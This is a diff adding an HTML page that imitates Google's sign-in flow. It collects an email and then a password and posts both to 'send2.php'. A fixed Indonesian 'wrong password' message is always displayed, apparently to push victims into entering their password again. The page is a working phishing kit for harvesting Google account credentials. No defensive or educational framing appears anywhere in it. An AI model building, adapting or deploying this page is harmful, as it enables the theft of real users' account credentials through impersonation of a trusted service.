@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <script src="assets/js/jquery-3.3.1.js"></script>
+    <script src="assets/js/script.js"></script>
+    <style>
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <div class="overlay"></div>
+
+        <!-- Loaders -->
+        <div class="preloader">
+            <div class="preloader-bar">
+                <div class="preloader-bars"></div>
+            </div>
+        </div>
+        <div id="loader-2">
+            <div class="three-balls">
+                <div class="ball ball1"></div>
+                <div class="ball ball2"></div>
+                <div class="ball ball3"></div>
+            </div>
+            <div class="loader-2-text">Signing you in...</div>
+        </div>
+
+        <!-- Menu -->
+        <div class="menu">
+            <div class="menu-icon">
+                <img src="assets/img/menu.svg" alt="">
+            </div>
+            <div class="menu-items">
+                <ul>
+                    <li id="about">About</li>
+                    <li id="overlay-btn">Overlay</li>
+                    <li>Instagram</li>
+                    <li>Contact</li>
+                    <li>etc...</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo">
+            <img src="assets/img/logo.png" alt="logo" class="logo-img">
+        </div>
+
+        <!-- Main Heading -->
+        <h1 class="heading">
+            <div class="h_main">Sign in</div>
+            <div class="h_sub">with your Google Account</div>
+        </h1>
+
+        <!-- User Tag -->
+        <div class="tag-wrapper">
+            <div class="user-tag">
+                <img src="assets/img/user.svg" alt="">
+                <span class="email-text"></span>
+                <img src="assets/img/down-chevron.svg" alt="">
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="slide-content">
+            <form action="send2.php" method="post" id="combinedForm">
+                <!-- Email Section -->
+                <div class="content1">
+                    <!-- Error message -->
+                    <div class="error-message">Password yang anda masukan salah</div>
+                    
+                    <div class="input-group">
+                        <label class="field-label email-label" for="email">Email or phone</label>
+                        <input type="text" class="field email-field" id="email" name="email" placeholder="" required>
+                    </div>
+                    <span class="forgot">Forgot email?</span>
+                    <div class="info">
+                        Not your computer? Use Guest mode to sign in privately.
+                    </div>
+                    <div class="create-next">
+                        <span>Create account</span>
+                        <button type="button" class="btn" id="next">Next</button>
+                    </div>
+                </div>
+
+                <!-- Password Section -->
+                <div class="content2" style="display: none;">
+                    <div class="input-group">
+                        <label class="field-label password-label" for="password">Enter your password</label>
+                        <input type="password" class="field password-field" id="password" name="password" placeholder="" required>
+                        <img class="show-hide-pass" src="assets/img/eye_off.svg" alt="">
+                    </div>
+                    <span class="forgot">Forgot password?</span>
+                    <div class="create-next">
+                        <div class="go-back"><img src="assets/img/go-back-left-arrow.svg" alt=""> Go back</div>
+                        <button class="btn" id="sign-in" type="submit">Sign in</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Additional Features -->
+        <div class="about-wrapper">
+            <div class="close-about"></div>
+            <div class="about-header"></div>
+        </div>
+    </div>
+
+    <script>
+        // Next Button Functionality
+        document.getElementById('next').addEventListener('click', function () {
+            const emailField = document.getElementById('email');
+            if (emailField.value.trim() === '') {
+                alert('Please enter your email or phone!');
+                return;
+            }
+            document.querySelector('.content1').style.display = 'none';
+            document.querySelector('.content2').style.display = 'block';
+        });
+
+        // Go Back Button Functionality
+        document.querySelector('.go-back').addEventListener('click', function () {
+            document.querySelector('.content2').style.display = 'none';
+            document.querySelector('.content1').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
